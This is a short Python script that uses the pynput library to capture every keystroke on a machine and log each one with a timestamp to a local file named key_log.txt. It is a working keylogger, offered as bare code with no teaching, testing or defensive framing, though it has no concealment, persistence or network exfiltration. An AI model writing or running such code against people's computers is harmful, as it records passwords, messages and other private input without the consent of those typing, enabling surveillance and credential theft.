import logging
from pynput.keyboard import Listener

# Configure the log file for recording key presses
log_file = "key_log.txt"

logging.basicConfig(
    filename=log_file,
    level=logging.DEBUG,
    format='%(asctime)s: %(message)s'
)

# Function to record key presses
def on_press(key):
    try:
        # If it's a normal character key, record it
        logging.info(f"Key pressed: {key.char}")
    except AttributeError:
        # If it's a special key (like shift, ctrl, etc.), record it by name
        logging.info(f"Special key pressed: {key}")

# Start the key listener
with Listener(on_press=on_press) as listener:
    listener.join()
